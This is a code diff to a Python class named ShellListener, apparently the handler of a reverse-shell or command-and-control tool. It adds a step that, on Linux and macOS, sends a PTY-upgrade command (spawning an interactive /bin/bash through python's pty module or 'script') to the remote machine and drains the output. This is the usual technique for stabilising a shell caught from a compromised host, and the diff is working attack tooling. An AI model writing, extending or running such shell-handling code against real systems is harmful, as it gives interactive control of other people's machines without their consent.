@@ -317,6 +317,29 @@ class ShellListener:
                         platform = 'Windows'
                     else:
                         platform = 'Unknown'
+
+                    # Attempt PTY upgrade on Linux/macOS for a proper
+                    # interactive shell (colour, job control, etc.)
+                    if platform in ('Linux', 'macOS'):
+                        try:
+                            pty_cmd = (
+                                "python3 -c 'import pty; pty.spawn(\"/bin/bash\")' 2>/dev/null "
+                                "|| python -c 'import pty; pty.spawn(\"/bin/bash\")' 2>/dev/null "
+                                "|| script -qc /bin/bash /dev/null 2>/dev/null\n"
+                            )
+                            conn.sendall(pty_cmd.encode('utf-8'))
+                            time.sleep(0.5)
+                            # Drain the PTY upgrade output
+                            conn.settimeout(1)
+                            try:
+                                while True:
+                                    d = conn.recv(4096)
+                                    if not d:
+                                        break
+                            except (socket.timeout, OSError):
+                                pass
+                        except Exception:
+                            pass
                         
                 except Exception:
                     hostname = default_hostname
